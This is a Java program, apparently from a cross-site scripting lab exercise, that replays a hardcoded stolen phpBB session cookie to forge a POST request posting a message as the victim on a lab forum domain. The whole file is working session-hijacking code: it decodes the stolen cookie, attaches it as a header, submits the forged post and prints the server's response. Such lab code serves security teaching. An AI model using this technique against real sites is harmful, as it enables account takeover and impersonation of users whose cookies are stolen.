import java.io.*;
import java.net.*;
public class HTTPSimpleForge {

	public static void main(String[] args) throws IOException {

		try {
			int responseCode;
			InputStream responseIn=null;

			// URL to be forged.
			URL url = new URL ("http://www.xsslabphpbb.com/posting.php");
			
			// URLConnection instance is created to further parameterize a
			// resource request past what the state members of URL instance
			// can represent.
			URLConnection urlConn = url.openConnection();
			if (urlConn instanceof HttpURLConnection) {
				urlConn.setConnectTimeout(60000);
				urlConn.setReadTimeout(90000);
			}

			// addRequestProperty method is used to add HTTP Header Information.
			// Here we add User-Agent HTTP header to the forged HTTP packet.
			urlConn.addRequestProperty("User-agent","Sun JDK 1.6");
			urlConn.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");
			
			String stolenCookie = "phpbb2mysql_t%3Da%253A5%253A%257Bi%253A1%253Bi%253A1418225227%253Bi%253A2%253Bi%253A1418223204%253Bi%253A5%253Bi%253A1418223252%253Bi%253A6%253Bi%253A1418223310%253Bi%253A7%253Bi%253A1418225234%253B%257D%3B%20phpbb2mysql_data%3Da%253A2%253A%257Bs%253A11%253A%2522autologinid%2522%253Bs%253A0%253A%2522%2522%253Bs%253A6%253A%2522userid%2522%253Bs%253A1%253A%25224%2522%253B%257D%3B%20phpbb2mysql_sid%3D642b0037b1b4f81a4141e8fb505e50f6";


			String decodedCookie = URLDecoder.decode(stolenCookie); 
				
			System.out.println(decodedCookie);

			urlConn.addRequestProperty("Cookie", decodedCookie);
			//HTTP Post Data which includes the information to be sent to the server.
			String data="subject=AYBABTU&message=AllYourBaseAreBelongToUs&mode=reply&sid=642b0037b1b4f81a4141e8fb505e50f6&t=1&post=Submit";

			// DoOutput flag of URL Connection should be set to true
			// to send HTTP POST message.
			urlConn.setDoOutput(true);

			// OutputStreamWriter is used to write the HTTP POST data
			// to the url connection.
			OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
			wr.write(data);
			wr.flush();

			// HttpURLConnection a subclass of URLConnection is returned by
			// url.openConnection() since the url is an http request.
			if (urlConn instanceof HttpURLConnection) {

						 HttpURLConnection httpConn = (HttpURLConnection) urlConn;
						 // Contacts the web server and gets the status code from
						 // HTTP Response message.
						 responseCode = httpConn.getResponseCode();
						 System.out.println("Response Code = " + responseCode);
						 // HTTP status code HTTP_OK means the response was
						 // received sucessfully.
						 if (responseCode == HttpURLConnection.HTTP_OK) {
						         // Get the input stream from url connection object.
						         responseIn = urlConn.getInputStream();
						         // Create an instance for BufferedReader
						         // to read the response line by line.
						         BufferedReader buf_inp = new BufferedReader(
						                         new InputStreamReader(responseIn));
						         String inputLine;
						         while((inputLine = buf_inp.readLine())!=null) {
						                 System.out.println(inputLine);
						         }
						 }
			}
    } catch (MalformedURLException e) {
               e.printStackTrace();
    }
  }
}
